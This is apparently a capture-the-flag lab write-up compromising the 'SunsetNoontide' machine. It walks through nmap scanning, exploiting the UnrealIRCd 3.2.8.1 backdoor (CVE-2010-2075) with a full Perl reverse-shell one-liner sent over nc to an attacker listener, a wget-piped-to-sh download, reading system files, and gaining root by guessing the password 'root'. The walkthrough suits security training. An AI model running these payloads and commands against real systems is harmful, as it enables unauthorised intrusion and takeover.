# SunsetNoontide

- [Discovery](#discovery)
- [Foothold](#foothold)
- [Privilege Escalation](#privilege-escalation)


## Discovery

1) We run `nmap` to discover open TCP ports on the target

``` ┌──(kali㉿kali)-[~]
└─$ nmap -v -pp -T4 sunsetnoontide

...

PORT     STATE SERVICE
6667/tcp open  irc
6697/tcp open  ircs-u
8067/tcp open  infi-async
```

2) We run `nmap` again to determine additional information about running services including service versions


```
┌──(kali㉿kali)-[~]
└─$ nmap -v -p 6667,6697,8067 -T4 -A sunsetnoontide

...

PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd
Service Info: Host: irc.foonet.com
```

From the results, we can deduce the host is running Internet Relay Chat (IRC) servers on the three open ports ([IETF RFC](https://datatracker.ietf.org/doc/html/rfc2810) | [Wikipedia](https://en.wikipedia.org/wiki/IRC)).

3) We look for known exploits in exploit-db with `searchsploit`

```
┌──(kali㉿kali)-[~]
└─$ searchsploit unrealirc
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)  | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow       | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                     | windows/dos/27407.pl
-------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The version we got back from `nmap` (UnrealIRCd") doesn't have a version number, so we'll just test our luck against the results above.

We are interested in remote command execution, so we'll start by trying the third from the top in the list above

## Foothold

4) So unfortunately, the exploit file references some sites taken offline (efnetbs.webs.com). So we'll have to modify the file to inject a reverse shell directly instead of downloading it from the internet. Before we do that, we take a step back to learn more about the vulnerability we are trying to exploit:

With some googling we find that the code aims to exploit CVE-2010-2075 ([mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075) | [nist](https://nvd.nist.gov/vuln/detail/CVE-2010-2075)).

> UnrealIRCd 3.2.8.1, as distributed on certain mirror sites from November 2009 through June 2010, contains an externally introduced modification (Trojan Horse) in the DEBUG3\_DOLOG\_SYSTEM macro, which allows remote attackers to execute arbitrary commands.

4.1) I'll use `msfvenom` to generate the reverse shell with the parameters I want. Listing available payloads that match what I need

> Every desktop/server distribution of Linux has Perl installed by default, so that's always a good choice

```
┌──(kali㉿kali)-[~]
└─$ msfvenom --list payloads | grep reverse | grep perl
    cmd/unix/reverse_perl                                              Creates an interactive shell via perl
    cmd/unix/reverse_perl_ssl                                          Creates an interactive shell via perl, uses SSL
    cmd/windows/reverse_perl                                           Creates an interactive shell via perl
    php/reverse_perl                                                   Creates an interactive shell via perl
```

We'll use `cmd/unix/reverse_perl`

4.2) Viewing config options for that payload (most output hidden for brevity)

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p cmd/unix/reverse_perl --list-options   
Options for payload/cmd/unix/reverse_perl:
=========================

...

Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port
```

4.3) Generating the reverse shell with the right options:

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p cmd/unix/reverse_perl -f raw LHOST=192.168.45.239 LPORT=4242 > rshell.pl  
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 233 bytes

                                                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ cat rshell.pl
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.45.239:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'                                                                                                                              
```

4.4) While modifying our exploit code to inject our reverse shell instead of trying to download it from the internet, I notice the exploit is quite simple and I opt to drop the payload directly with `nc`

Note at this point I've already set up a local listener in a different tab to catch our reverse shell:

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4242
listening on [any] 4242 ...
```

Here we go (the second line is the payload):

```
┌──(kali㉿kali)-[~]
└─$ nc 192.168.234.120 6667
:irc.foonet.com NOTICE AUTH :*** Looking up your hostname...
AB; perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.45.239:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
:irc.foonet.com NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
:irc.foonet.com 451 AB; :You have not registered
```

And we catch a shell on our listener, yay!

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4242
listening on [any] 4242 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.234.120] 46676
whoami
server
```

5) We search the current user's home directory and find our flag:

```
ls -la /home/server | grep -e local -e txt -e flag
-rw-r--r-- 1 server server   33 Mar  3 10:56 local.txt
cat /home/server/local.txt
0a6f84095ec1b101471dfab5e47a6d59
```

We aren't done yet though - we want root.

## Privilege Escalation

> We span a shell cause rawdoggin' it ain't fun:
> 
> ```
> which python3
/usr/bin/python3
>
python3 -c 'import pty; pty.spawn("/bin/bash")'
server@noontide:~/irc/Unreal3.2$ 
``` 

6) Tried to run LinPEAS, however it seems like nothing resolves in here... 

```
server@noontide:~/irc/Unreal3.2$ wget -O- https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
--2024-03-03 13:26:57--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
Resolving github.com (github.com)... 
failed: Temporary failure in name resolution.
wget: unable to resolve host address ‘github.com’
```
```
server@noontide:~/irc/Unreal3.2$ ping google.com
ping google.com
ping: google.com: Temporary failure in name resolution
```

Tried downloading by IP ignoring SSL, however the script itself downloads other things using hostnames...

7) Trying to look for a vector manually, roughly following the checks in [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation).

- Exploitable Kernel?

<details>
<summary>`cat /proc/version`</summary>

```
server@noontide:~/irc/Unreal3.2$ cat /proc/version
cat /proc/version
Linux version 4.19.0-10-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)

```
</details>


<details>

<summary>`cat /etc/os-release`</summary>

```
server@noontide:~/irc/Unreal3.2$ cat /etc/os-release
cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```
</details>

No, Linux 10 doesn't have any known kernel exploits.

- Any noteworthy cronjobs?

<details>

<summary>`cat /etc/crontab`</summary>

```
server@noontide:~/irc/Unreal3.2$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

</details>

Nope

- Any odd SUID binaries?

<details>

<summary>`ls -la /usr/bin | grep rws`</summary>

```
server@noontide:~/irc/Unreal3.2$ ls -la /usr/bin | grep rws
ls -la /usr/bin | grep rws
-rwsr-xr-x  1 root root      54096 Jul 27  2018 chfn
-rwsr-xr-x  1 root root      44528 Jul 27  2018 chsh
-rwsr-xr-x  1 root root      34896 Apr 22  2020 fusermount
-rwsr-xr-x  1 root root      84016 Jul 27  2018 gpasswd
-rwsr-xr-x  1 root root      51280 Jan 10  2019 mount
-rwsr-xr-x  1 root root      44440 Jul 27  2018 newgrp
-rwsr-xr-x  1 root root      63736 Jul 27  2018 passwd
-rwsr-xr-x  1 root root      63568 Jan 10  2019 su
-rwsr-xr-x  1 root root      34888 Jan 10  2019 umount
```

</details>

Nope, and `/usr/sbin` didn't have any ones either.

- Any hashes to crack in `/etc/passwd`?

<details>

<summary>`cat /etc/passwd`</summary>

```
server@noontide:~/irc/Unreal3.2$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
server:x:1000:1000:server,,,:/home/server:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

</details>

Nope

8) Trying default passwords on user `root` out of desperation:

```
server@noontide:~/irc/Unreal3.2$ su root
su root
Password: toor

su: Authentication failure
server@noontide:~/irc/Unreal3.2$ su root
su root
Password: password

su: Authentication failure
server@noontide:~/irc/Unreal3.2$ su root
su root
Password: root

root@noontide:/home/server/irc/Unreal3.2# whoami
whoami
root
```

9) We get our flag from the root dir

```
root@noontide:/home/server/irc/Unreal3.2# ls -la /root | grep -e proof -e txt
ls -la /root | grep -e proof -e txt
-rw-------  1 root root   33 Mar  3 10:56 proof.txt
root@noontide:/home/server/irc/Unreal3.2# cat /root/proof.txt
cat /root/proof.txt
72cd8304b63da9db8b4c00a61359ee68
```
